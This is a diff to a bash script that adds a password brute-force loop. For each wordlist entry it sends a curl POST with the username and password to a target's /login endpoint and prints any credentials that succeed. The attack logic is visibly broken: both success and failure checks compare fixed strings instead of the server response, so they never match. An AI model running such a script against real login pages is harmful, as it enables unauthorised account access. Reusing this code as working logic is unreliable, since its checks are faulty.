@@ -88,10 +88,19 @@ begin(){
 	printf "===================================================\n\n"
 
 
-	while read -r line
+	while read -r pass
 	do
-	     echo "[-] Trying: $line"
 
+		response=$(curl -X Post "$url/login" -d "username=$user&password=$pass")
+
+		if [[ "*fail*" == "*response*" ]]; then 
+
+			echo "[-] Trying: $pass"
+		elif [[ "*success*" == "response" ]]; then
+
+			echo "[+] FOUND → $user:$pass"
+			exit 1
+		fi
 	done < "$wl"
 }
 while getopts ":u:U:w:" opts
